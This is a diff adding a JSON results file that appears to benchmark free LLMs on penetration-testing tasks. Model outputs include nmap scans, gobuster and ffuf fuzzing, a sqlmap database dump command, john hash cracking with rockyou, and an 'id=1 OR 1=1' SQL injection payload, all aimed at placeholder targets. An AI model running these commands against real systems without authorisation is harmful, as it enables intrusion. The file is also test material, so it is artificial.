+        "testName": "exploit_nmap_command",
+        "latency": 0,
+        "response": "",
+        "validJson": false,
+        "error": "Error: OpenRouter 429: {\"error\":{\"message\":\"Provider returned error\",\"code\":429,\"metadata\":{\"raw\":\"google/gemma-3-12b-it:free is temporarily rate-limited upstream. Please retry shortly, or add your own key to accumulate your rate limits: https://openrouter.ai/settings/integrations\",\"provider_name\":\"Google AI Studio\",\"is_byok\":false}},\"user_id\":\"user_3Boa57qPWQD53ILKFCxaMgwYIUR\"}"
+      },
+      {
+        "model": "google/gemma-3-12b-it:free",
+        "provider": "openrouter",
+        "testName": "exploit_gobuster_command",
+        "latency": 0,
+        "response": "",
+        "validJson": false,
+        "error": "Error: OpenRouter 429: {\"error\":{\"message\":\"Provider returned error\",\"code\":429,\"metadata\":{\"raw\":\"google/gemma-3-12b-it:free is temporarily rate-limited upstream. Please retry shortly, or add your own key to accumulate your rate limits: https://openrouter.ai/settings/integrations\",\"provider_name\":\"Google AI Studio\",\"is_byok\":false}},\"user_id\":\"user_3Boa57qPWQD53ILKFCxaMgwYIUR\"}"
+      },
+      {
+        "model": "google/gemma-3-12b-it:free",
+        "provider": "openrouter",
+        "testName": "exploit_ffuf_command",
+        "latency": 0,
+        "response": "",
+        "validJson": false,
+        "error": "Error: OpenRouter 429: {\"error\":{\"message\":\"Provider returned error\",\"code\":429,\"metadata\":{\"raw\":\"google/gemma-3-12b-it:free is temporarily rate-limited upstream. Please retry shortly, or add your own key to accumulate your rate limits: https://openrouter.ai/settings/integrations\",\"provider_name\":\"Google AI Studio\",\"is_byok\":false}},\"user_id\":\"user_3Boa57qPWQD53ILKFCxaMgwYIUR\"}"
+      },
+      {
+        "model": "google/gemma-3-12b-it:free",
+        "provider": "openrouter",
+        "testName": "mission_plan_json",
+        "latency": 0,
+        "response": "",
+        "validJson": false,
+        "error": "Error: OpenRouter 429: {\"error\":{\"message\":\"Provider returned error\",\"code\":429,\"metadata\":{\"raw\":\"google/gemma-3-12b-it:free is temporarily rate-limited upstream. Please retry shortly, or add your own key to accumulate your rate limits: https://openrouter.ai/settings/integrations\",\"provider_name\":\"Google AI Studio\",\"is_byok\":false}},\"user_id\":\"user_3Boa57qPWQD53ILKFCxaMgwYIUR\"}"
+      },
+      {
+        "model": "google/gemma-3-12b-it:free",
+        "provider": "openrouter",
+        "testName": "finding_json",
+        "latency": 0,
+        "response": "",
+        "validJson": false,
+        "error": "Error: OpenRouter 429: {\"error\":{\"message\":\"Provider returned error\",\"code\":429,\"metadata\":{\"raw\":\"google/gemma-3-12b-it:free is temporarily rate-limited upstream. Please retry shortly, or add your own key to accumulate your rate limits: https://openrouter.ai/settings/integrations\",\"provider_name\":\"Google AI Studio\",\"is_byok\":false}},\"user_id\":\"user_3Boa57qPWQD53ILKFCxaMgwYIUR\"}"
+      },
+      {
+        "model": "google/gemma-3-12b-it:free",
+        "provider": "openrouter",
+        "testName": "code_review_json",
+        "latency": 0,
+        "response": "",
+        "validJson": false,
+        "error": "Error: OpenRouter 429: {\"error\":{\"message\":\"Provider returned error\",\"code\":429,\"metadata\":{\"raw\":\"google/gemma-3-12b-it:free is temporarily rate-limited upstream. Please retry shortly, or add your own key to accumulate your rate limits: https://openrouter.ai/settings/integrations\",\"provider_name\":\"Google AI Studio\",\"is_byok\":false}},\"user_id\":\"user_3Boa57qPWQD53ILKFCxaMgwYIUR\"}"
+      }
+    ]
+  },
+  {
+    "model": "google/gemma-3-4b-it:free",
+    "provider": "openrouter",
+    "testsPassed": 3,
+    "testsFailed": 0,
+    "avgLatency": 2497,
+    "validJsonRate": 100,
+    "skipped": 3,
+    "results": [
+      {
+        "model": "google/gemma-3-4b-it:free",
+        "provider": "openrouter",
+        "testName": "exploit_nmap_command",
+        "latency": 3071,
+        "response": "```json\n{\"command\": \"nmap -sV -sC -p- -oA 192.168.1.0_scan 192.168.1.0/24\", \"description\": \"Full port scan with service detection\", \"args\": [\"-sV\", \"-sC\", \"-p-\", \"-oA\"]}\n```",
+        "validJson": true,
+        "parseable": {
+          "command": "nmap -sV -sC -p- -oA 192.168.1.0_scan 192.168.1.0/24",
+          "description": "Full port scan with service detection",
+          "args": [
+            "-sV",
+            "-sC",
+            "-p-",
+            "-oA"
+          ]
+        }
+      },
+      {
+        "model": "google/gemma-3-4b-it:free",
+        "provider": "openrouter",
+        "testName": "exploit_gobuster_command",
+        "latency": 2029,
+        "response": "```json\n{\n  \"command\": \"gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt\",\n  \"description\": \"Directory enumeration\",\n  \"args\": [\"dir\", \"-u\", \"-w\", \"-o\"]\n}\n```",
+        "validJson": true,
+        "parseable": {
+          "command": "gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt",
+          "description": "Directory enumeration",
+          "args": [
+            "dir",
+            "-u",
+            "-w",
+            "-o"
+          ]
+        }
+      },
+      {
+        "model": "google/gemma-3-4b-it:free",
+        "provider": "openrouter",
+        "testName": "exploit_ffuf_command",
+        "latency": 2390,
+        "response": "```json\n{\"command\": \"ffuf -u 'http://target.local/search?query=FUZZ' -w /usr/share/wordlists/ffuf/parameters.txt -o ffuf_results.json -of json\", \"description\": \"Parameter fuzzing\", \"args\": [\"-u\", \"-w\", \"-o\", \"-of\"]}\n```",
+        "validJson": true,
+        "parseable": {
+          "command": "ffuf -u 'http://target.local/search?query=FUZZ' -w /usr/share/wordlists/ffuf/parameters.txt -o ffuf_results.json -of json",
+          "description": "Parameter fuzzing",
+          "args": [
+            "-u",
+            "-w",
+            "-o",
+            "-of"
+          ]
+        }
+      },
+      {
+        "model": "google/gemma-3-4b-it:free",
+        "provider": "openrouter",
+        "testName": "mission_plan_json",
+        "latency": 0,
+        "response": "",
+        "validJson": false,
+        "error": "Error: OpenRouter 429: {\"error\":{\"message\":\"Provider returned error\",\"code\":429,\"metadata\":{\"raw\":\"google/gemma-3-4b-it:free is temporarily rate-limited upstream. Please retry shortly, or add your own key to accumulate your rate limits: https://openrouter.ai/settings/integrations\",\"provider_name\":\"Google AI Studio\",\"is_byok\":false}},\"user_id\":\"user_3Boa57qPWQD53ILKFCxaMgwYIUR\"}"
+      },
+      {
+        "model": "google/gemma-3-4b-it:free",
+        "provider": "openrouter",
+        "testName": "finding_json",
+        "latency": 0,
+        "response": "",
+        "validJson": false,
+        "error": "Error: OpenRouter 429: {\"error\":{\"message\":\"Provider returned error\",\"code\":429,\"metadata\":{\"raw\":\"google/gemma-3-4b-it:free is temporarily rate-limited upstream. Please retry shortly, or add your own key to accumulate your rate limits: https://openrouter.ai/settings/integrations\",\"provider_name\":\"Google AI Studio\",\"is_byok\":false}},\"user_id\":\"user_3Boa57qPWQD53ILKFCxaMgwYIUR\"}"
+      },
+      {
+        "model": "google/gemma-3-4b-it:free",
+        "provider": "openrouter",
+        "testName": "code_review_json",
+        "latency": 0,
+        "response": "",
+        "validJson": false,
+        "error": "Error: OpenRouter 429: {\"error\":{\"message\":\"Provider returned error\",\"code\":429,\"metadata\":{\"raw\":\"google/gemma-3-4b-it:free is temporarily rate-limited upstream. Please retry shortly, or add your own key to accumulate your rate limits: https://openrouter.ai/settings/integrations\",\"provider_name\":\"Google AI Studio\",\"is_byok\":false}},\"user_id\":\"user_3Boa57qPWQD53ILKFCxaMgwYIUR\"}"
+      }
+    ]
+  },
+  {
+    "model": "stepfun/step-3.5-flash:free",
+    "provider": "openrouter",
+    "testsPassed": 4,
+    "testsFailed": 2,
+    "avgLatency": 17822,
+    "validJsonRate": 67,
+    "skipped": 0,
+    "results": [
+      {
+        "model": "stepfun/step-3.5-flash:free",
+        "provider": "openrouter",
+        "testName": "exploit_nmap_command",
+        "latency": 10432,
+        "response": "{\"command\": \"nmap -sV -sC -p- -oA 192.168.1.0_scan 192.168.1.0/24\", \"description\": \"Full port scan with service detection\", \"args\": [\"-sV\", \"-sC\", \"-p-\", \"-oA\"]}",
+        "validJson": true,
+        "parseable": {
+          "command": "nmap -sV -sC -p- -oA 192.168.1.0_scan 192.168.1.0/24",
+          "description": "Full port scan with service detection",
+          "args": [
+            "-sV",
+            "-sC",
+            "-p-",
+            "-oA"
+          ]
+        }
+      },
+      {
+        "model": "stepfun/step-3.5-flash:free",
+        "provider": "openrouter",
+        "testName": "exploit_gobuster_command",
+        "latency": 18648,
+        "response": "{\n  \"command\": \"gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt\",\n  \"description\": \"Directory enumeration\",\n  \"args\": [\"dir\", \"-u\", \"http://target.local\", \"-w\", \"/usr/share/wordlists/dirb/common.txt\", \"-o\", \"gobuster_results.txt\"]\n}",
+        "validJson": true,
+        "parseable": {
+          "command": "gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt",
+          "description": "Directory enumeration",
+          "args": [
+            "dir",
+            "-u",
+            "http://target.local",
+            "-w",
+            "/usr/share/wordlists/dirb/common.txt",
+            "-o",
+            "gobuster_results.txt"
+          ]
+        }
+      },
+      {
+        "model": "stepfun/step-3.5-flash:free",
+        "provider": "openrouter",
+        "testName": "exploit_ffuf_command",
+        "latency": 17792,
+        "response": "{\n  \"command\": \"ffuf -u 'http://target.local/search?query=FUZZ' -w /usr/share/wordlists/ffuf/parameters.txt -o ffuf_results.json -of json\",\n  \"description\": \"Parameter fuzzing for GET parameter 'query' using common parameter wordlist\",\n  \"args\": [\"-u\", \"-w\", \"-o\", \"-of\"]\n}",
+        "validJson": true,
+        "parseable": {
+          "command": "ffuf -u 'http://target.local/search?query=FUZZ' -w /usr/share/wordlists/ffuf/parameters.txt -o ffuf_results.json -of json",
+          "description": "Parameter fuzzing for GET parameter 'query' using common parameter wordlist",
+          "args": [
+            "-u",
+            "-w",
+            "-o",
+            "-of"
+          ]
+        }
+      },
+      {
+        "model": "stepfun/step-3.5-flash:free",
+        "provider": "openrouter",
+        "testName": "mission_plan_json",
+        "latency": 27438,
+        "response": "",
+        "validJson": false,
+        "error": "SyntaxError: JSON Parse error: Unexpected EOF"
+      },
+      {
+        "model": "stepfun/step-3.5-flash:free",
+        "provider": "openrouter",
+        "testName": "finding_json",
+        "latency": 14799,
+        "response": "```json\n{\n  \"finding_id\": \"auto-001\",\n  \"severity\": \"medium\",\n  \"title\": \"SSH Service Detected\",\n  \"description\": \"SSH (Secure Shell) service is running on port 22 of host 10.0.0.5. This service provides encrypted remote administration access and should be properly secured to prevent unauthorized access. Without proper configuration, SSH can be a target for brute-force attacks, credential stuffing, or exploitation of known vulnerabilities.\",\n  \"evidence\": {\n    \"port\": 22,\n    \"service\": \"ssh\",\n    \"version\": \"\"\n  },\n  \"recommendations\": [\n    \"Ensure SSH is configured securely: disable root login, use key-based authentication instead of passwords, and change the default port if not required.\",\n    \"Restrict SSH access using firewall rules to only trusted IP addresses or networks.\",\n    \"Keep the SSH server software updated to the latest version to patch known vulnerabilities.\",\n    \"Implement fail2ban or similar intrusion prevention to block repeated failed login attempts.\",\n    \"Monitor SSH logs for suspicious activity and unauthorized access attempts.\"\n  ]\n}\n```",
+        "validJson": true,
+        "parseable": {
+          "finding_id": "auto-001",
+          "severity": "medium",
+          "title": "SSH Service Detected",
+          "description": "SSH (Secure Shell) service is running on port 22 of host 10.0.0.5. This service provides encrypted remote administration access and should be properly secured to prevent unauthorized access. Without proper configuration, SSH can be a target for brute-force attacks, credential stuffing, or exploitation of known vulnerabilities.",
+          "evidence": {
+            "port": 22,
+            "service": "ssh",
+            "version": ""
+          },
+          "recommendations": [
+            "Ensure SSH is configured securely: disable root login, use key-based authentication instead of passwords, and change the default port if not required.",
+            "Restrict SSH access using firewall rules to only trusted IP addresses or networks.",
+            "Keep the SSH server software updated to the latest version to patch known vulnerabilities.",
+            "Implement fail2ban or similar intrusion prevention to block repeated failed login attempts.",
+            "Monitor SSH logs for suspicious activity and unauthorized access attempts."
+          ]
+        }
+      },
+      {
+        "model": "stepfun/step-3.5-flash:free",
+        "provider": "openrouter",
+        "testName": "code_review_json",
+        "latency": 0,
+        "response": "",
+        "validJson": false,
+        "error": "Error: OpenRouter 405: {\"error\":{\"message\":\"Provider returned error\",\"code\":405,\"metadata\":{\"raw\":\"<!doctypehtml><html lang=\\\"zh-cn\\\"><meta charset=\\\"utf-8\\\"><meta http-equiv=\\\"X-UA-Compatible\\\"content=\\\"IE=edge,chrome=1\\\"><meta name=\\\"data-spm\\\"content=\\\"a3c0e\\\"><title>405</title><style>a,body,div,h2,html,p{margin:0;padding:0}a{text-decoration:none;color:#3b6ea3}.container{width:1000px;margin:auto;color:#696969}.header{padding:110px 0}.header .message{height:36px;padding-left:120px;background:url(https://errors.aliyun.com/images/TB1TpamHpXXXXaJXXXXeB7nYVXX-104-162.png) no-repeat 0 -128px;line-height:36px}.main{padding:50px 0;background:#f4f5f7}#block_image{position:relative;left:120px}</style><body data-spm=\\\"7663354\\\"><div data-spm=\\\"1998410538\\\"><div class=\\\"header\\\"><div class=\\\"container\\\"><div class=\\\"message\\\"><div id=\\\"block_message\\\"></div><div><span id=\\\"block_url_tips\\\"></span><strong id=\\\"url\\\"></strong></div><div><span id=\\\"block_time_tips\\\"></span><strong id=\\\"time\\\"></strong></div><div><span id=\\\"block_traceid_tips\\\"></span><strong id=\\\"traceid\\\"></strong></div></div></div></div><div class=\\\"main\\\"><div class=\\\"container\\\"><img id=\\\"block_image\\\"></div></div></div><script>function getRenderData(){var e=document.getElementById(\\\"renderData\\\");return JSON.parse(e.innerHTML)}function convertTimestampToString(e){e=parseInt(e,10),e=new Date(e);return e.getFullYear()+\\\"-\\\"+(\\\"0\\\"+(e.getMonth()+1)).slice(-2)+\\\"-\\\"+(\\\"0\\\"+e.getDate()).slice(-2)+\\\" \\\"+(\\\"0\\\"+e.getHours()).slice(-2)+\\\":\\\"+(\\\"0\\\"+e.getMinutes()).slice(-2)+\\\":\\\"+(\\\"0\\\"+e.getSeconds()).slice(-2)}var en_tips={block_message:\\\"Sorry, your request has been blocked as it may cause potential threats to the server's security.\\\",block_url_tips:\\\"Current URL: \\\",block_time_tips:\\\"Request Time: \\\",block_traceid_tips:\\\"Your Request ID is: \\\"},cn_tips={block_message:\\\"很抱歉，由于您访问的URL有可能对网站造成安全威胁，您的访问被阻断。\\\",block_url_tips:\\\"当前网址: \\\",block_time_tips:\\\"请求时间: \\\",block_traceid_tips:\\\"您的请求ID是: \\\"};window.onload=function(){var t=getRenderData(),n=\\\"cn\\\";try{navigator.language.startsWith(\\\"zh\\\")||(n=\\\"en\\\")}catch(e){t.lang&&(n=t.lang)}if(t){var e,i=cn_tips,r=document.getElementById(\\\"block_image\\\");for(e in\\\"en\\\"===n?(i=en_tips,r.src=\\\"https://g.alicdn.com/sd-base/static/1.0.5/image/405.png\\\",r.id=\\\"en_block\\\"):r.src=\\\"https://errors.aliyun.com/images/TB15QGaHpXXXXXOaXXXXia39XXX-660-117.png\\\",i)document.getElementById(e).innerText=i[e];n=t.traceid,r=n.slice(8,21);document.getElementById(\\\"traceid\\\").innerText=n,document.getElementById(\\\"url\\\").innerText=location.href.split(\\\"?\\\")[0],document.getElementById(\\\"time\\\").innerText=convertTimestampToString(r)}}</script><textarea id=\\\"renderData\\\" style=\\\"display:none...\",\"provider_name\":\"StepFun\",\"is_byok\":false}},\"user_id\":\"user_3Boa57qPWQD53ILKFCxaMgwYIUR\"}"
+      }
+    ]
+  },
+  {
+    "model": "qwen/qwen3.6-plus:free",
+    "provider": "openrouter",
+    "testsPassed": 6,
+    "testsFailed": 0,
+    "avgLatency": 19229,
+    "validJsonRate": 100,
+    "skipped": 0,
+    "results": [
+      {
+        "model": "qwen/qwen3.6-plus:free",
+        "provider": "openrouter",
+        "testName": "exploit_nmap_command",
+        "latency": 15940,
+        "response": "{\"command\": \"nmap -sV -sC -p- -oA 192.168.1.0_scan 192.168.1.0/24\", \"description\": \"Full port scan with service detection\", \"args\": [\"-sV\", \"-sC\", \"-p-\", \"-oA\"]}",
+        "validJson": true,
+        "parseable": {
+          "command": "nmap -sV -sC -p- -oA 192.168.1.0_scan 192.168.1.0/24",
+          "description": "Full port scan with service detection",
+          "args": [
+            "-sV",
+            "-sC",
+            "-p-",
+            "-oA"
+          ]
+        }
+      },
+      {
+        "model": "qwen/qwen3.6-plus:free",
+        "provider": "openrouter",
+        "testName": "exploit_gobuster_command",
+        "latency": 28640,
+        "response": "{\"command\": \"gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt\", \"description\": \"Directory enumeration on http://target.local using a common wordlist\", \"args\": [\"dir\", \"-u\", \"-w\"]}",
+        "validJson": true,
+        "parseable": {
+          "command": "gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt",
+          "description": "Directory enumeration on http://target.local using a common wordlist",
+          "args": [
+            "dir",
+            "-u",
+            "-w"
+          ]
+        }
+      },
+      {
+        "model": "qwen/qwen3.6-plus:free",
+        "provider": "openrouter",
+        "testName": "exploit_ffuf_command",
+        "latency": 14066,
+        "response": "{\"command\": \"ffuf -u 'http://target.local/search?query=FUZZ' -w /usr/share/wordlists/ffuf/parameters.txt -o ffuf_results.json -of json\", \"description\": \"Parameter fuzzing\", \"args\": [\"-u\", \"-w\", \"-o\", \"-of\"]}",
+        "validJson": true,
+        "parseable": {
+          "command": "ffuf -u 'http://target.local/search?query=FUZZ' -w /usr/share/wordlists/ffuf/parameters.txt -o ffuf_results.json -of json",
+          "description": "Parameter fuzzing",
+          "args": [
+            "-u",
+            "-w",
+            "-o",
+            "-of"
+          ]
+        }
+      },
+      {
+        "model": "qwen/qwen3.6-plus:free",
+        "provider": "openrouter",
+        "testName": "mission_plan_json",
+        "latency": 24039,
+        "response": "{\n  \"mission_id\": \"test-001\",\n  \"objectives\": [\n    \"Identify and validate security vulnerabilities in the target web application\",\n    \"Assess authentication, session management, and authorization controls\",\n    \"Test for OWASP Top 10 vulnerabilities including injection, XSS, and broken access control\",\n    \"Document findings with proof-of-concept evidence and provide prioritized remediation guidance\"\n  ],\n  \"phases\": [\n    {\n      \"name\": \"Reconnaissance & Information Gathering\",\n      \"tools\": [\"nmap\", \"subfinder\", \"httpx\", \"whois\"],\n      \"commands\": [\n        \"nmap -sV -sC -p 80,443,8080 target.com\",\n        \"subfinder -d target.com -o subs.txt\",\n        \"httpx -l subs.txt -status-code -title -tech-detect\"\n      ]\n    },\n    {\n      \"name\": \"Vulnerability Scanning & Analysis\",\n      \"tools\": [\"burpsuite\", \"nuclei\", \"nikto\"],\n      \"commands\": [\n        \"nikto -h https://target.com -output nikto_report.html\",\n        \"nuclei -u https://target.com -t cves/ -t vulnerabilities/ -severity high,critical\",\n        \"burpsuite-proxy --listen 127.0.0.1:8080 --config burp_config.json\"\n      ]\n    },\n    {\n      \"name\": \"Exploitation & Validation\",\n      \"tools\": [\"sqlmap\", \"ffuf\", \"metasploit\"],\n      \"commands\": [\n        \"sqlmap -u 'https://target.com/api/v1/users?id=1' --batch --dbs --risk=3\",\n        \"ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403\",\n        \"msfconsole -x 'use auxiliary/scanner/http/dir_scanner; set RHOSTS target.com; run'\"\n      ]\n    },\n    {\n      \"name\": \"Post-Exploitation & Reporting\",\n      \"tools\": [\"john\", \"dradis\", \"pandoc\"],\n      \"commands\": [\n        \"john --wordlist=/usr/share/wordlists/rockyou.txt captured_hashes.txt\",\n        \"dradis --new-project test-001 --import burp_export.xml\",\n        \"pandoc findings.md -o report.pdf --template pentest_template.tex\"\n      ]\n    }\n  ],\n  \"expected_duration\": \"2h\"\n}",
+        "validJson": true,
+        "parseable": {
+          "mission_id": "test-001",
+          "objectives": [
+            "Identify and validate security vulnerabilities in the target web application",
+            "Assess authentication, session management, and authorization controls",
+            "Test for OWASP Top 10 vulnerabilities including injection, XSS, and broken access control",
+            "Document findings with proof-of-concept evidence and provide prioritized remediation guidance"
+          ],
+          "phases": [
+            {
+              "name": "Reconnaissance & Information Gathering",
+              "tools": [
+                "nmap",
+                "subfinder",
+                "httpx",
+                "whois"
+              ],
+              "commands": [
+                "nmap -sV -sC -p 80,443,8080 target.com",
+                "subfinder -d target.com -o subs.txt",
+                "httpx -l subs.txt -status-code -title -tech-detect"
+              ]
+            },
+            {
+              "name": "Vulnerability Scanning & Analysis",
+              "tools": [
+                "burpsuite",
+                "nuclei",
+                "nikto"
+              ],
+              "commands": [
+                "nikto -h https://target.com -output nikto_report.html",
+                "nuclei -u https://target.com -t cves/ -t vulnerabilities/ -severity high,critical",
+                "burpsuite-proxy --listen 127.0.0.1:8080 --config burp_config.json"
+              ]
+            },
+            {
+              "name": "Exploitation & Validation",
+              "tools": [
+                "sqlmap",
+                "ffuf",
+                "metasploit"
+              ],
+              "commands": [
+                "sqlmap -u 'https://target.com/api/v1/users?id=1' --batch --dbs --risk=3",
+                "ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403",
+                "msfconsole -x 'use auxiliary/scanner/http/dir_scanner; set RHOSTS target.com; run'"
+              ]
+            },
+            {
+              "name": "Post-Exploitation & Reporting",
+              "tools": [
+                "john",
+                "dradis",
+                "pandoc"
+              ],
+              "commands": [
+                "john --wordlist=/usr/share/wordlists/rockyou.txt captured_hashes.txt",
+                "dradis --new-project test-001 --import burp_export.xml",
+                "pandoc findings.md -o report.pdf --template pentest_template.tex"
+              ]
+            }
+          ],
+          "expected_duration": "2h"
+        }
+      },
+      {
+        "model": "qwen/qwen3.6-plus:free",
+        "provider": "openrouter",
+        "testName": "finding_json",
+        "latency": 21932,
+        "response": "```json\n{\n  \"finding_id\": \"auto-001\",\n  \"severity\": \"medium\",\n  \"title\": \"SSH Service Detected\",\n  \"description\": \"An SSH (Secure Shell) service was detected running on port 22 at IP address 10.0.0.5. While SSH is a standard and secure protocol for remote administration, an exposed SSH service can be a target for brute-force attacks, credential stuffing, or exploitation of known vulnerabilities if not properly hardened.\",\n  \"evidence\": {\n    \"port\": 22,\n    \"service\": \"ssh\",\n    \"version\": \"\"\n  },\n  \"recommendations\": [\n    \"Enforce key-based authentication and disable password authentication.\",\n    \"Disable direct root login via SSH (set PermitRootLogin to no).\",\n    \"Restrict SSH access to authorized IP ranges using firewall rules or AllowUsers/AllowGroups directives.\",\n    \"Keep the SSH server software updated to the latest patched version.\",\n    \"Implement rate limiting or fail2ban to mitigate brute-force attacks.\",\n    \"Consider changing the default listening port to reduce exposure to automated scanners.\"\n  ]\n}\n```",
+        "validJson": true,
+        "parseable": {
+          "finding_id": "auto-001",
+          "severity": "medium",
+          "title": "SSH Service Detected",
+          "description": "An SSH (Secure Shell) service was detected running on port 22 at IP address 10.0.0.5. While SSH is a standard and secure protocol for remote administration, an exposed SSH service can be a target for brute-force attacks, credential stuffing, or exploitation of known vulnerabilities if not properly hardened.",
+          "evidence": {
+            "port": 22,
+            "service": "ssh",
+            "version": ""
+          },
+          "recommendations": [
+            "Enforce key-based authentication and disable password authentication.",
+            "Disable direct root login via SSH (set PermitRootLogin to no).",
+            "Restrict SSH access to authorized IP ranges using firewall rules or AllowUsers/AllowGroups directives.",
+            "Keep the SSH server software updated to the latest patched version.",
+            "Implement rate limiting or fail2ban to mitigate brute-force attacks.",
+            "Consider changing the default listening port to reduce exposure to automated scanners."
+          ]
+        }
+      },
+      {
+        "model": "qwen/qwen3.6-plus:free",
+        "provider": "openrouter",
+        "testName": "code_review_json",
+        "latency": 10758,
+        "response": "{\"vulnerability\": \"SQL Injection\", \"severity\": \"critical\", \"location\": \"line 2\", \"exploit\": \"id=1 OR 1=1\", \"fix\": \"Use prepared statements\"}",
+        "validJson": true,
+        "parseable": {
+          "vulnerability": "SQL Injection",
+          "severity": "critical",
+          "location": "line 2",
+          "exploit": "id=1 OR 1=1",
+          "fix": "Use prepared statements"
+        }
+      }
+    ]
+  }
+]
